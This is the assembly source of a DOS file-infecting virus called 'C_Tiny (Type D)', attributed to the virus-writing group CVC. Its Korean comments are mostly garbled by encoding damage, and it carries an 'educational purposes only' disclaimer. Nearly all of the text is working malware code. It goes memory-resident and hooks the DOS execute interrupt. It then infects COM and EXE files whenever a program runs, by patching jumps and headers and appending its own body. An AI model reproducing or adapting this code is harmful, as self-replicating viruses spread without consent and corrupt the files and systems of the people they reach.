;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;					     \\\\\\\  \       \   \\\\\\\
;	 C_Tiny    (Type D)		    \	       \     \	 \
;					    \		\   \	 \    98/05
;					    \		 \ \	 \
;					     \\\\\\\	  \	  \\\\\\\ #04
;
; Virus Name : C_Tiny (Type D)
; Author     : Crom
; Group      : CVC
; Origin     : Corea
; Date	     : 1998/05/02
; Type	     : Memory resident COM/EXE
;
;  !*< ��I�� ���� >********************************************************!
;   *									     *
;   * �w�� !								     *
;   *	     �� �����e �a�B�ⷥ ����a���e �a�w�A�ᴡ �s���a. �����e ��      *
;   *	     �����i �a�wЁ�� �i���a�e ��� ���A�A ��Ё�ᕡ �����i ���� �g    *
;   *	     �s���a. ���e �����e �i�i ���e �a�q�A�A ���s���a.		     *
;   *									     *
;   * Warning ! 							     *
;   *	     This information is for educational purposes only. We are	     *
;   *	     not responsible for any problems caused by the use of this      *
;   *	     information. Responsibility is entirely placed on the reader    *
;   *									     *
;   !************************************************************************!
;
; �e�e�e ���w�� �a����a�� ������a �B�� �����a�A �w���e�a. (0020:0000)
; ������a �B��A �w���a�a�� �aõ �i���a�e ���a�Q�A á�w�ⷩ �� ���a. �a�a��
; �a����a�e ������a �B�� �����a�� ���w�� 0 ���� ��a �e�a. 0 �� �a���a�e ��
; �� �w��Ё ����a ���A��A�� �a�w�a�� ���a.
;
; D �w�e EXE �a���� �q�q��ǩ �� ���a. š�a�a IVT �w���w �a����a�� �e���A �᷁
; �B�bЁ �����e 300 �a���a�a �e�A�e �a���� COM,EXE �a�� ���� �q�q ��ǩ �� ���a.
; �e���e �a����a�� �a�w�b�e �a���� COM/EXE �q�q �a����a�� �����a.
; �a�e ���a ���w�� ���� �������e �a����a �a�� �����A ��� �� ������ �a�w�e �A
; �����i �a�� ��Ё�� ���bЖ�a.
;
;  C_Tiny (Type A) : �A�� ���
;  C_Tiny (Type B) : ���e�� Anti-Heuristic ���� �a�w
;  C_Tiny (Type C) : ���b�� ���a�e �w�� �a�� (Anti-Heuristic)
;  C_Tiny (Type D) : EXE �a���� �q�q, �啡�� �a�� �q�q �A�A
;
;  �|�a�� Anti-Heuristic �i �a�w�a�e ���i �a���b�a�� C_Tiny �e �{���a �e�a.
;
;  Thanx : Dark Angel, T�L�N
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

	    .MODEL  TINY
	    .CODE
	    .286

            org   0h
 Mem_size   equ   offset End_Memory	; �A���� �a��
 Vir_size   equ   offset End_virus	; ���A �a����a �a��
 EXE_ID     equ   'CT'                  ; EXE �a�� ���i�a

 C_Tiny:
            db    0E8h, 0, 0            ;
            pop   si                    ; �a����a ���b�� ���a��
            sub   si, 0003              ;
            push  ds
            xor   ax,ax                 ; š�a�� �A�����i ��Ё�� �|�����i �a
            mov   es,ax                 ; �����a.
            mov   di, 0200h             ;
	    mov   cx, Mem_size		; �a����a ���� �e�q ���a
            push  di
 Check_IVT_Zero:
            repz  scasb                 ; 0000:0200 �A�� �a����a�a���e�q ����
            pop   di                    ; �e ���� ��a�e�a.
            jnz   ChkCOMorEXEFile       ; �����e�� �a���e �w�� ͡��

 Copy_Vir_IVT:
            push  si                    ;
            mov   cx, Vir_size          ; �a����a ����
	    db	  2Eh			; CS:SI -> ES:DI
            repz  movsb                 ; �a����a ���b��á -> 0000:0200
            pop   si                    ; SI = �a����a ���b��

            push  es                    ;
            pop   ds                    ; DS=0000
            mov   di, offset End_Virus + 200h ; 200h �e IVT �����t (0:200h)
            mov   ax, offset NewInt21   ; ������a 21h ���a�U
            xchg  ax, ds:[0084h]
            stosw                       ; �A�a���a �e�w
            mov   ax, 20h               ; �a����a �A�a���a�e (0020h)
                                        ; ���a�U�� 00xxh ���� �����A AL �A ���q
            xchg  ax, ds:[0086h]
            stosw                       ; AX=ES:DI
            pop   ds                    ; �������A�� ��wЖ�� DS
 chkCOMorEXEFile:
            add   si, offset OldHeader  ; SI = ���b�� + �����A�ᯡ�b��
            mov   di,100h               ; COM �a������ ��a
            cmp   word ptr DS:[DI],0E94Dh
            jnz   Return_EXE

 Restore_COM_Head:
	    push  cs
	    pop   es
	    push  di			; �����i ���� ��w
	    movsw			; 4 �a���a ����
	    movsw			;
	    ret 			; CS:100h �� ����

 Return_EXE:                            ; EXE ����
            push  ds
            pop   es
            mov   ax,ds
            add   ax,10h
            add   word ptr cs:[si+2],ax ;
            jmp   dword ptr cs:[si]     ;

 OldHeader  dw    0h                    ; ���� COM �|����
            dw    0FFF0h                ; �a���A 10h �i ���a�e 0 ���E�a.
            db    'C_TinyD'             ; �a����a ���q

 lseek:
	    mov   ah,42h		; ͡����
	    xor   cx,cx
	    cwd
	    int   21h
	    ret

 InfectEXE:
            push  ax                    ; file size
	    push  dx

            push  si
            mov   si, offset FileBuffer+14h
            movsw
            movsw

            add   ax, vir_size          ; �a����a ���� ���a��
	    adc   dx,0

            mov   cx,200h               ; / 512
	    div   cx

            or    dx,dx                 ; �a�ỡ�a �����a�e�a ?
	    jz	  nohiccup
	    inc   ax
  nohiccup:
            pop   si
            mov   word ptr ds:[si+4],ax
            mov   word ptr ds:[si+2],dx

	    pop   dx
	    pop   ax

            mov   cx,10h                ;
	    div   cx

            sub   ax,ds:[si+8]

            mov   di, offset FileBuffer + 12h
            push  ax
            mov   ax, EXE_ID
            stosw                       ; EXE_ID [DI+12h]
            xchg  ax,dx
            stosw                       ; DI+14h -> IP
            pop   ax
            stosw                       ; DI+16h -> CS
	    jmp   Write_Virus

 NewInt21:
	    pusha			; 286 + �A�� ����
	    push  ds
	    push  es

	    xor   ah,4Bh		; ��З���a ?
            jnz   Error

            mov   ax,  3D02h            ; �a�� �i��
            int   21h
            jc    Error                 ; �i�� �A�� ?
            xchg  ax,bx                 ; BX = �a��Ѕ�i

	    push  cs			; �A�a���a ɷ��
	    pop   ds
	    push  cs
	    pop   es

            mov   ah, 3Fh               ; �a�� ����
            mov   cx, 18h               ; �a���a��
            mov   dx, offset FileBuffer ; ���� ����
            int   21h

            mov   si, dx
            mov   di, offset OldHeader

            mov   al,2                  ; �a�� �{�a�� ����
            call  lseek

            cmp   byte ptr [SI+18h], '@'; �啡�� �a�����a ?
            jz    Close
            cmp   word ptr [SI+12h],EXE_ID   ; EXE �q�q�a�� ��a
            jz    Close
            cmp   word ptr [SI], 0E94Dh ; �q�q�E COM �a��
	    jz	  Close
            cmp   word ptr [SI], 'ZM'   ; EXE �a�����a ?
	    jz	  InfectEXE

            push  si
            movsw                       ; COM �A�ᦁ�� ��w
            movsw
            pop   di                    ; FileBuffer

            push  ax
            mov   ax, 0E94Dh            ; �q�q ���i�a + JMP
            stosw                       ; JMP -> FileBuffer
            pop   ax
            sub   ax,0004               ;
            stosw

 Write_Virus:
            mov   ah, 40h               ; �a����a �a��
            mov   cx, offset Vir_size   ; �a����a ����
	    xor   dx,dx 		; ���� ���a�U
            int   21h

	    xor   al,al 		; �a�� ��q�a�� ����
            call  lseek

            mov   ah, 40h               ; �|���� �a��
            mov   cx, 18h               ; �a���a ��
            mov   dx, offset FileBuffer ; ���a�U
            int   21h

 Close:
            mov   ah, 3Eh               ; �a�� �h��
            int   21h
 Error:
	    pop   es
	    pop   ds
	    popa
 Jmp_Org_Int21:
	    db	  0EAh			; --> �a���a�� �a���A ��w
 End_Virus:
            dw    ?,?                   ; Old Int 21h
 FileBuffer db    18h dup (0)

 End_Memory:                            ; �A�����A�� �a����a �{ ��á
	    END   C_Tiny
